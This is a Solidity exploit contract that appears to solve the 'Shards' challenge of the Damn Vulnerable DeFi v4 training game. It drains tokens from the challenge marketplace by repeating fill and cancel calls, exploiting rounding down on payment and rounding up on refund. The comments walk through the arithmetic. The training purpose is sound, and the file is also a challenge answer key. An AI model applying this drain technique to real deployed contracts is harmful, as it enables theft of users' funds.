// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {ShardsNFTMarketplace, DamnValuableToken} from "../../src/shards/ShardsNFTMarketplace.sol";
import {console} from "forge-std/console.sol";

contract ShardsAttacker {
    DamnValuableToken token;
    ShardsNFTMarketplace marketplace;
    address recovery;

    constructor(
        DamnValuableToken _token,
        ShardsNFTMarketplace _marketplace,
        address _recovery
    ) {
        token = _token;
        marketplace = _marketplace;
        recovery = _recovery;
    }

    function attack() external {
        token.approve(address(marketplace), type(uint256).max);
        // player have to pay => want * (1_000_000e6 * 75e15 / 1e6) / 10_000_000e18 => want * 75 / 10000
        // the logic mulDivDown the fee, if want is small enough the total price will be 0
        // 100(want) * 75 / 10000 => 0

        // nftId = 51
        marketplace.fill(1, 100);
        // becuase of weird time check logic in cancel function, emidiate cancel after fill works
        // in cancel logic return amount will be calculated with mulDivUp function
        // planer will get 75e11
        marketplace.cancel(1, 0);
        console.log(
            "Amount of token hijacked after one fill and cancel cycle",
            token.balanceOf(address(this))
        );

        // now once again call fill function. this time want can be up to 1e15
        // than cancel will return 75e24 and that exceed marketplace balance so let's just do less
        // want(1e15) * 75 / 10000 = 75e11 (MAX want 1e15) => will return 75e24
        marketplace.fill(1, 1e9);
        marketplace.cancel(1, 1);
        console.log(
            "Amount of token hijacked after second fill and cancel cycle",
            token.balanceOf(address(this))
        );

        token.transfer(recovery, token.balanceOf(address(this)));
    }
}
